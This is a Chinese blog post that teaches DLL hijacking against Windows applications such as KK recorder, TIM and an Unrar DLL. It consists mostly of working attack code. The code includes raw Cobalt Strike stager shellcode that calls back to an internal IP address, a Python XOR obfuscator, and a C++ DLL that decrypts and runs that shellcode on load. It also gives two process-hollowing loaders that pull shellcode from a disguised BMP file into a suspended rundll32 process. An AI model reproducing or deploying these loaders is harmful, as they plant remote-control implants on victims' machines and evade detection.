---
title: DLL劫持
published: 2025-05-16 17:30
tags: [DLL劫持, Shellcode, Windows]
category: 系统
draft: false
---

# dll劫持

## 0x00 调用DLL

查找程序运行所调用的dll文件

```
x64dbg
x32dbg
process
……
```

## 0x01 生成DLL

加密CS生成的shellcode

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# @Time : 2025/2/19 09:00
# @Author : 大C菌
# @File : xor.py
# @Software : PyCharm
def xor_encrypt(shellcode, key):
    encrypted_shellcode = bytearray()
    key_len = len(key)

    # 遍历shellcode中的每个字节
    for i in range(len(shellcode)):
        # 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中
        # 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用
        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])
    return encrypted_shellcode

def main():
    # CS生成的shellcode
    buf = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x5c\x11\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x32\x72\x68\x00\x22\x68\x78\x35\x12\xea\xb2\x57\x0e\x76\xb5\x7d\x30\x9f\x23\x2e\xaf\xf4\x83\x5d\x72\x2e\x7a\x29\x3a\xcd\x3b\x7f\x6c\x26\xd3\x34\x1b\x30\x80\x4d\xfc\x3b\x95\x10\x85\x76\x36\xc0\x5c\x36\xd1\xf0\xeb\xcb\xda\x6c\xb5\x78\xfc\xa6\x9b\xad\x98\x75\xd1\xc0\x82\x7c\x99\x08\x51\x8f\x65\xc9\xfa\xa4\x4e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x53\x45\x4d\x29\x0d\x0a\x00\x84\xf4\x94\x75\x5d\xa7\x5e\xc7\x53\x76\xd3\xee\xe2\xbb\x3e\x58\xea\xc5\xbb\x77\xd9\xe6\x4a\x53\x22\xe6\x1c\x18\x46\x54\x0e\xe8\x4e\x03\x3f\xbc\x75\x28\xd4\x2a\x0c\xb1\xa7\xa2\xd6\xf0\x9c\x1b\xed\xb0\x7a\x2c\x7e\x4a\x36\x7e\x92\x3e\xda\xe3\x32\xca\x55\x35\x30\x98\x0b\x50\x81\xd7\x7c\x50\xc7\xfe\xeb\xf1\xfc\xab\x0b\xe8\x30\xa5\xbb\x31\xac\x8d\x79\x29\xb2\xc3\xd2\x6d\x9b\x5a\x80\x0b\x5c\xa0\x06\x98\x00\x66\x32\x80\xf4\x1d\xe2\xd4\xbb\x19\xe0\x0c\xa0\x35\x94\xdb\x1f\x6a\x39\x57\x3b\xca\xf2\xf9\x52\x8f\x6a\xda\x60\xd9\x64\x35\xfd\x8b\x5a\xa8\x52\x5e\x43\x57\x1c\xfb\x8e\xe1\xed\x34\x9a\xf3\x72\x06\xc3\x0f\x2b\xbc\xe1\xf7\x03\xb0\x6d\xfb\x1a\xd4\x91\x6c\xb7\xe6\xdc\xe6\xcb\xec\xef\x82\xb1\x7d\xbd\xd3\x38\x33\x55\x16\x1e\x4d\x28\x8d\x5c\x25\x46\xdf\x6f\x55\xc7\x4c\xfa\x72\x5d\x8e\xb9\x69\xaa\x60\x79\x2f\x25\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x30\x2e\x31\x2e\x32\x33\x39\x2e\x31\x34\x38\x00\x17\x50\x65\xea"

    shellcode = bytearray(buf)

    # 定义密钥
    key = bytearray(b'dcj666')

    # 使用xor_encrypt函数加密shellcode
    encrypted_shellcode = xor_encrypt(shellcode, key)

    # 输出加密后的shellcode
    print("Encrypted shellcode:")
    encrypted_shellcode_string = ""
    for byte in encrypted_shellcode:
        encrypted_shellcode_string += ("\\x%02x"%byte)
    print(encrypted_shellcode_string)

if __name__ == '__main__':
    main()
```

构造shellcode的dll文件

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>
#include <iostream>
HANDLE My_hThread = NULL;
DWORD  WINAPI  ceshi(LPVOID pParameter)
{
    char encryptedShellcode[] = "\x98\x8b\xe3\x36\x36\x36\x04\xea\x8f\x07\xe4\x52\xef\x31\x5a\xbd\x64\x3a\xef\x31\x7e\xbd\x44\x1e\x6b\xd4\x20\x10\x07\xc9\x55\xa3\xc6\x0a\x57\x4a\x66\x4f\x4a\xf7\xf9\x3b\x65\xa4\x88\xc6\x64\x61\xef\x31\x7a\xbd\x74\x0a\x65\xb3\xe1\x76\x4e\xb3\xa4\x17\x20\x37\xe6\x66\xef\x2b\x72\xbd\x6e\x16\x65\xb0\x89\x0a\x7f\xbd\x50\xe8\x6b\xe0\x07\xc9\x55\xa3\xc6\xf7\xf9\x3b\x65\xa4\x52\xd6\x43\xc2\x67\x1e\x92\x0d\x4b\x12\x11\x81\x32\xbd\x6e\x12\x65\xb0\x0c\xbd\x3a\x7d\xef\x3b\x76\x37\xe5\xbd\x60\xe8\x6b\xe6\xbf\x72\x40\x47\x31\x6d\x57\x6f\x3e\x32\x95\xd6\x6e\x69\x3e\xe8\x78\xdd\xb0\x6b\x0c\x0d\x0f\x42\x36\x5e\x13\x0a\x04\x5f\x62\x5e\x28\x14\x4c\x31\xc9\xe3\x55\x9c\x3d\x61\x61\x61\x33\x0b\x50\x60\x4f\x91\x9b\xb6\x83\xb2\x36\x36\x64\x38\x5b\xff\x67\x67\x0e\x60\x3b\x67\x5e\x6a\x75\x63\x6a\x65\x66\x5e\x33\xea\xf5\xf0\xc9\xe3\x8f\x13\x31\x07\xe4\x64\x0c\x63\x68\x76\xb2\x64\x36\x31\x39\x64\x66\x5e\x8f\x36\x44\x0d\xc9\xe3\xed\xa5\xe9\xf5\x66\x07\x9b\x34\x3d\x5c\xc9\x65\x32\x0b\x47\x30\x2e\x4d\x9b\xb6\xef\xf6\x39\xb2\xa7\x62\x6a\x36\x07\xc9\xe1\x95\x1e\x32\xbf\xcf\x8f\x6a\x02\x9c\xf3\xd4\x39\x9c\xbf\xbf\xf7\x5e\x21\x42\x34\x07\xc9\xe3\x55\x9c\x3d\x5c\x31\x67\x32\x33\x02\x81\x61\xd6\x6f\x9c\xbf\x89\x36\x19\x64\x63\x53\xf1\x42\x81\x55\x9c\x83\xa7\x37\x36\x64\x8a\xa3\x37\x36\x36\x8c\xe8\x95\xc9\xc9\x19\x34\x51\x18\x5e\x36\x14\x0c\x1b\x5f\x24\xdc\x84\x33\x6d\x1c\x83\x4b\x06\xfb\x40\x44\x99\xc2\xb5\x39\x11\x44\x4c\x1f\x0c\xa9\x58\x15\x5a\x10\xe5\x50\x78\x5a\xb6\x7b\xca\x5f\xf6\x7a\xb3\x40\x00\xa4\x3f\x5c\xe7\xc6\xdd\xaf\xb9\x06\x83\x4e\xca\xc2\xf8\xc7\xae\x43\xe7\xa4\xe1\x16\xaf\x3e\x67\xeb\x06\xa3\xcc\x92\x78\x64\x36\x19\x53\x44\x1b\x25\x04\x0f\x58\x42\x0c\x44\x2e\x05\x4c\x5f\x5a\x08\x02\x45\x03\x18\x06\x44\x4b\x09\x59\x5b\x46\x05\x17\x03\x54\x5a\x53\x5f\x43\x27\x65\x7f\x73\x44\x5a\x44\x06\x0d\x16\x33\x0a\x04\x52\x59\x41\x17\x43\x24\x62\x16\x00\x4a\x52\x51\x16\x61\x79\x33\x55\x5e\x0d\x16\x62\x16\x0a\x0e\x53\x58\x42\x4b\x56\x44\x06\x0d\x16\x26\x2c\x23\x73\x0f\x0d\x21\x2d\x3f\x65\x65\x73\x29\x4a\x67\x3c\x36\xb2\x90\xf7\x1f\x6b\x91\x68\xa3\x30\x1c\xe5\xd8\xd4\xdf\x5d\x32\xdc\xf3\x8d\x13\xba\x8c\x7c\x65\x14\x82\x7f\x72\x70\x62\x38\x8c\x2d\x69\x09\x8a\x43\x4c\xb7\x40\x3a\x87\x91\xc6\xb5\x9a\xaa\x2d\xdb\xd4\x19\x46\x48\x7c\x00\x1a\xf1\x54\xec\xd5\x04\xae\x36\x5f\x06\xae\x3d\x34\xe2\xbd\x4a\x66\xf1\x9a\x88\x9b\xca\x9d\x3d\x8c\x53\xcf\x8d\x07\x9a\xe9\x1a\x43\x84\xf5\xe4\x09\xf8\x30\xb6\x3d\x6a\xc4\x65\xf2\x36\x50\x04\xe4\x97\x77\xd4\xe2\x8d\x7d\x83\x66\x96\x03\xa2\xbf\x7c\x00\x0f\x61\x0d\xae\x91\x93\x64\xb9\x5c\xbe\x03\xb3\x52\x03\xcb\xef\x39\xc2\x64\x68\x75\x33\x7f\x91\xb8\xd7\xdb\x50\xf9\x99\x44\x30\xf5\x6b\x48\xd6\xd7\xc1\x35\xd4\x0e\x91\x2c\xe2\xa7\x08\xd4\x8c\xea\xd0\xfd\x88\x8c\xe8\x87\x4b\x8b\xb7\x5b\x59\x63\x20\x28\x29\x4b\xe7\x6a\x13\x70\xbb\x0c\x3f\xf1\x7a\xcc\x16\x3e\xe4\x8f\x5f\x9c\x04\x1a\x45\x13\x36\x5e\x94\xd6\xc8\x60\xc9\xe3\x0e\x23\x02\x36\x26\x36\x64\x0b\x6a\x36\x76\x36\x33\x0b\x32\x92\x65\xd3\x9b\xb6\xf9\x8f\x36\x36\x64\x63\x6b\xef\x67\x65\xed\x84\x3d\x5e\x36\x16\x64\x63\x39\x60\x5e\x24\xf2\xea\x88\xc9\xe3\xb3\xa4\x17\xac\xbd\x31\x37\xa7\xe6\xaa\x43\xd3\x6e\xa7\x8b\xc3\xcb\xc9\xc9\x55\x53\x44\x07\x18\x04\x57\x5a\x44\x07\x02\x0e\x64\x74\x3a\x53\xdc";

    // 定义解密所用的密钥

    char key[] = "dcj666";

    // 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode
    unsigned char shellcode[sizeof encryptedShellcode];

    // 获取密钥的长度
    int keylength = strlen(key);

    // 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];
        printf("\\x%x", shellcode[i]);
    }

    // 获取解密后的shellcode的地址
    char* addrShellcode = (char*)shellcode;

    // 声明一个DWORD变量用于存储旧的内存保护属性
    DWORD dwOldPro = 0;

    // 更改解密后的shellcode所在内存区域的保护属性，允许执行、读、写
    BOOL ifExec = VirtualProtect(addrShellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldPro);

    // 使用EnumUILanguages函数执行解密后的shellcode
    EnumUILanguages((UILANGUAGE_ENUMPROC)addrShellcode, 0, 0);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH://初次调用dll时执行下面代码
        My_hThread = ::CreateThread(NULL, 0, &ceshi, 0, 0, 0);//新建线程
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
extern"C" _declspec(dllexport) void test()
{
    int a;
    a = 0;
}
```

生成对应32位或64位的dll文件

## 0x02 注入DLL

### 1、系统白名单调用dll文件

上传dll，系统程序调用执行

```
rundll32.exe KKDll.dll ceshi
```

### 2、白名单程序调用dll文件

观察对方的第三方程序，本地模拟程序加载dll，制作好之后上传到dll目录，然后执行dll上线

KK录像机

![](/images/posts/dll-hijack/1.jpg)

添加导入函数

![](/images/posts/dll-hijack/2.jpg)

传入替换的libfontconfig-1.dll文件，传入KKDll.dll文件

![](/images/posts/dll-hijack/3.jpg)

运行KK录像机

![](/images/posts/dll-hijack/4.jpg)

### 3、白名单程序加载dll代码执行

```
1、筛选程序加载DLL（ProcessMonitor）
Process Name is <xxx.exe> ——
这就是我们自定义的白文件了，要看哪个文件就换成哪个就可以
Results contains "SUCCESS" ——
这是我们容易进行dll劫持的关键，"SUCCESS"是存在dll加载成功的情况表明exe确实去加载了这个dll，所以我们凭借此来做黑dll让它加载；
Path contains "dll" ——
就是说我们的目标是dll，其他乱七八糟的后缀我们不需要，就过滤掉；
2、获取目标DLL的主导函数及位数（VS自带dumpbin）
https://zhuanlan.zhihu.com/p/640045731
获取执行函数：dumpbin /exports "D:\Program Files (x86)\Tencent\QQ\Bin\TaskTray.dll"
获取执行位数：dumpbin /headers "D:\Program Files (x86)\Tencent\QQ\Bin\TaskTray.dll"
3、利用分离项目生成图片Shellcode
https://github.com/Mr-Un1k0d3r/DKMC
python2 dkmc.py
gen
set shellcode xxxx
run
```

![](/images/posts/dll-hijack/5.jpg)

![](/images/posts/dll-hijack/6.jpg)

![](/images/posts/dll-hijack/7.jpg)

#### 第一种方法

重写导出函数

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
using namespace std;

extern "C" __declspec(dllexport) int DllCanUnloadNow()
{
    return 0;
}
extern "C" __declspec(dllexport) int DllGetClassObject()
{
    return 0;
}
extern "C" __declspec(dllexport) int DllRegisterServer()
{
    return 0;
}
extern "C" __declspec(dllexport) int DllUnregisterServer()
{

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {

        FILE* fp;
        size_t size;
        unsigned char* buffer;
        fp = fopen("xd.bmp", "rb");
        fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
        fread(buffer, size, 1, fp);

        char* v7A = (char*)VirtualAlloc(0, size, 0x3000u, 0x40u);
        memcpy((void*)v7A, buffer, size);

        struct _PROCESS_INFORMATION ProcessInformation;
        struct _STARTUPINFOA StartupInfo;
        void* v24;
        CONTEXT Context;
        memset(&StartupInfo, 0, sizeof(StartupInfo));
        StartupInfo.cb = 68;
        BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
        if (result)
        {
            Context.ContextFlags = 65539;
            GetThreadContext(ProcessInformation.hThread, &Context);
            v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, size, 0x1000u, 0x40u);
            WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, NULL);
            // 64 位使用 Context.Rip = (DWORD_PTR)v24;
            Context.Eip = (DWORD_PTR)v24;
            //Context.Rip = (DWORD_PTR)v24;
            SetThreadContext(ProcessInformation.hThread, &Context);
            ResumeThread(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hThread);
            result = CloseHandle(ProcessInformation.hProcess);
        }

        TerminateProcess(GetCurrentProcess(), 0);

    }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

生成引用的bmp文件

```bash
┌──(dcj㉿kali)-[~/Desktop/tools/DKMC-master]
└─$ python2 dkmc.py
```

![](/images/posts/dll-hijack/8.jpg)

将生成的dll文件和bmp文件替换放到安装目录下

![](/images/posts/dll-hijack/9.jpg)

![](/images/posts/dll-hijack/10.jpg)

运行TIM

![](/images/posts/dll-hijack/11.jpg)

#### 第二种方法

```
上述方法可能会导致程序无法正常打开，所以在原基础上，加一个调用原本的dll程序，利用构造的dll程序运行调用原本的dll程序，构造的dll程序名为原本的dll程序名，被调用的原本的dll进行改名，再将xd.bmp放到同级目录

运行程序-->构造dll（修改为源程序dll名）-->调用源程序dll（修改其他名字）
```

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <TlHelp32.h>

using namespace std;

// 必须保留的COM接口导出函数
extern "C" __declspec(dllexport) HRESULT DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv)
{
    return CLASS_E_CLASSNOTAVAILABLE;
}

extern "C" __declspec(dllexport) HRESULT DllCanUnloadNow()
{
    return S_FALSE;
}

// 原始DLL的导出函数（根据实际需要调整参数类型）
extern "C" __declspec(dllexport) int RARCloseArchive() { return 0; }
extern "C" __declspec(dllexport) int RARGetDllVersion() { return 0; }
extern "C" __declspec(dllexport) int RAROpenArchive() { return 0; }
extern "C" __declspec(dllexport) int RAROpenArchiveEx() { return 0; }
extern "C" __declspec(dllexport) int RARProcessFile() { return 0; }
extern "C" __declspec(dllexport) int RARProcessFileW() { return 0; }
extern "C" __declspec(dllexport) int RARReadHeader() { return 0; }
extern "C" __declspec(dllexport) int RARReadHeaderEx() { return 0; }
extern "C" __declspec(dllexport) int RARSetCallback() { return 0; }
extern "C" __declspec(dllexport) int RARSetChangeVolProc() { return 0; }
extern "C" __declspec(dllexport) int RARSetPassword() { return 0; }
extern "C" __declspec(dllexport) int RARSetProcessDataProc() { return 0; }

// 加载并执行其他DLL的函数
void LoadAdditionalDLL()
{
    HMODULE hModule = LoadLibraryA("Unrar1.dll");
    if (hModule)
    {
        typedef void(*DLL_FUNC)();
        DLL_FUNC pFunc = (DLL_FUNC)GetProcAddress(hModule, "RunMe");
        if (pFunc)
        {
            pFunc(); // 执行目标DLL的函数
        }
        // 根据需求决定是否释放
        // FreeLibrary(hModule);
    }
}

// 注入线程函数
DWORD WINAPI InjectionThread(LPVOID lpParam)
{
    // 加载其他DLL
    LoadAdditionalDLL();

    // 原有注入逻辑
    FILE* fp = nullptr;
    size_t size = 0;
    unsigned char* buffer = nullptr;

    do
    {
        fp = fopen("xd.bmp", "rb");
        if (!fp) break;

        fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        buffer = (unsigned char*)malloc(size);
        if (!buffer) break;

        if (fread(buffer, 1, size, fp) != size) break;

        LPVOID v7A = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!v7A) break;

        memcpy(v7A, buffer, size);

        PROCESS_INFORMATION pi = { 0 };
        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);

        if (CreateProcessA(nullptr, (LPSTR)"rundll32.exe", nullptr, nullptr, FALSE,
            CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        {
            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(pi.hThread, &ctx))
            {
                LPVOID remoteMem = VirtualAllocEx(pi.hProcess, nullptr, size,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (remoteMem)
                {
                    WriteProcessMemory(pi.hProcess, remoteMem, v7A, size, nullptr);

#ifdef _WIN64
                    ctx.Rip = (DWORD_PTR)remoteMem;
#else
                    ctx.Eip = (DWORD_PTR)remoteMem;
#endif

                    SetThreadContext(pi.hThread, &ctx);
                }
            }
            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (false);

    // 清理资源
    if (fp) fclose(fp);
    if (buffer) free(buffer);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, InjectionThread, nullptr, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

![](/images/posts/dll-hijack/13.jpg)

![](/images/posts/dll-hijack/12.jpg)
